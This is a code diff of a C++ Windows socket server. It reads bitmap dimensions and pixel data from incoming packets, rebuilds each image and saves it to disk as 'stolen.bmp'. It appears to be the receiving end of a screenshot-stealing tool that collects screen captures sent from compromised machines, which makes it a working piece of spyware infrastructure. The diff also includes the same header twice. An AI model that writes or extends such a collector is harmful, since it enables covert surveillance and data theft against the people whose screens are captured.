@@ -5,6 +5,8 @@
 #include <stdio.h>
 
 #include <optional>
+#include <filesystem>
+#include <filesystem>
 
 #pragma comment (lib, "Ws2_32.lib")
 
@@ -12,6 +14,86 @@
 
 void readPacketPayload(Packet& packet, const char* buffer, int size) {
     packet.payload.insert(packet.payload.end(), buffer, buffer + size);
+}
+
+bool saveBmp(HBITMAP hBitmap, const std::filesystem::path filePath) {
+    BITMAP bmp;
+    if (GetObject(hBitmap, sizeof(BITMAP), &bmp)) {
+        HDC hDC = CreateCompatibleDC(NULL);
+        SelectObject(hDC, hBitmap);
+        int bitsPerPixel = bmp.bmBitsPixel;
+        int bytesPerPixel = bitsPerPixel / 8;
+        int bitmapSize = bmp.bmWidth * bmp.bmHeight * bytesPerPixel;
+        char* bitmapData = new char[bitmapSize];
+        BITMAPFILEHEADER bfh;
+        BITMAPINFOHEADER bih;
+        bih.biSize = sizeof(BITMAPINFOHEADER);
+        bih.biWidth = bmp.bmWidth;
+        bih.biHeight = bmp.bmHeight;
+        bih.biPlanes = 1;
+        bih.biBitCount = bitsPerPixel;
+        bih.biCompression = BI_RGB;
+        bih.biSizeImage = 0;
+        bih.biXPelsPerMeter = 0;
+        bih.biYPelsPerMeter = 0;
+        bih.biClrUsed = 0;
+        bih.biClrImportant = 0;
+        bfh.bfType = 0x4D42;
+        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+        bfh.bfSize = bfh.bfOffBits + bitmapSize;
+        if (GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, bitmapData, (BITMAPINFO*)&bih, DIB_RGB_COLORS)) {
+            FILE* file = fopen(filePath.string().c_str(), "wb");
+            if (file) {
+                fwrite(&bfh, sizeof(BITMAPFILEHEADER), 1, file);
+                fwrite(&bih, sizeof(BITMAPINFOHEADER), 1, file);
+                fwrite(bitmapData, 1, bitmapSize, file);
+                fclose(file);
+                delete[] bitmapData;
+                DeleteDC(hDC);
+                return true;
+            }
+        }
+        delete[] bitmapData;
+        DeleteDC(hDC);
+    }
+    return false;
+}
+
+HBITMAP reassembleBitmap(const Packet& packet) {
+    BITMAPINFOHEADER bi = { 0 };
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biPlanes = 1;
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = 0;
+    bi.biXPelsPerMeter = 0;
+    bi.biYPelsPerMeter = 0;
+    bi.biClrUsed = 0;
+    bi.biClrImportant = 0;
+
+    HDC hDC = GetDC(NULL);
+    if (hDC == NULL)
+        return NULL;
+
+    bi.biWidth = packet.biWidth;
+    bi.biHeight = packet.biHeight;
+    bi.biBitCount = packet.biBitCount;
+
+    HBITMAP hBitmap = CreateCompatibleBitmap(hDC, bi.biWidth, bi.biHeight);
+    if (hBitmap == NULL) {
+        ReleaseDC(NULL, hDC);
+        return NULL;
+    }
+
+    bi.biSizeImage = ((bi.biWidth * bi.biBitCount + 31) / 32) * 4 * bi.biHeight;
+
+    if (!SetDIBits(hDC, hBitmap, 0, bi.biHeight, packet.payload.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
+        DeleteObject(hBitmap);
+        ReleaseDC(NULL, hDC);
+        return NULL;
+    }
+
+    ReleaseDC(NULL, hDC);
+    return hBitmap;
 }
 
 std::optional<Packet> readPacket(SOCKET clientSocket) {
@@ -26,12 +108,18 @@ std::optional<Packet> readPacket(SOCKET clientSocket) {
         auto receivedBytes = recv(clientSocket, buffer, bufferLen, 0);
         if (receivedBytes > 0) {
             if (!sizeChunkRead) {
-                result.size = *reinterpret_cast<Packet::size_t*>(buffer);
+                result.biWidth = *reinterpret_cast<Packet::size_t*>(buffer);
+                result.biHeight = *reinterpret_cast<Packet::size_t*>(
+                    buffer + sizeof(Packet::size_t));
+                result.biBitCount = *reinterpret_cast<Packet::size_t*>(
+                    buffer + sizeof(Packet::size_t) * 2);
+                result.payloadSize = *reinterpret_cast<Packet::size_t*>(
+                    buffer + sizeof(Packet::size_t) * 3);
                 sizeChunkRead = true;
                 readPacketPayload(
                     result, 
-                    buffer + sizeof(Packet::size_t), 
-                    receivedBytes - sizeof(Packet::size_t));
+                    buffer + sizeof(Packet::size_t) * 4,
+                    receivedBytes - sizeof(Packet::size_t) * 4);
             }
             else {
                 readPacketPayload(result, buffer, receivedBytes);
@@ -53,7 +141,7 @@ std::optional<Packet> readPacket(SOCKET clientSocket) {
 
     closesocket(clientSocket);
 
-    if (result.size == result.payload.size()) {
+    if (result.payloadSize == result.payload.size()) {
         return std::move(result);
     }
     return std::nullopt;
@@ -62,7 +150,12 @@ std::optional<Packet> readPacket(SOCKET clientSocket) {
 void handleConnection(SOCKET clientSocket) {
     auto packet = readPacket(clientSocket);
     if (packet) {
-        printf("Message: %s\n", packet->payload.data());
+        saveBmp(reassembleBitmap(*packet), "stolen.bmp");
+
+        printf("biWidth: %d\n", packet->biWidth);
+        printf("biHeight: %d\n", packet->biHeight);
+        printf("biBitCount: %d\n", packet->biBitCount);
+        printf("payloadSize: %d\n", packet->payloadSize);
     }
 }
 
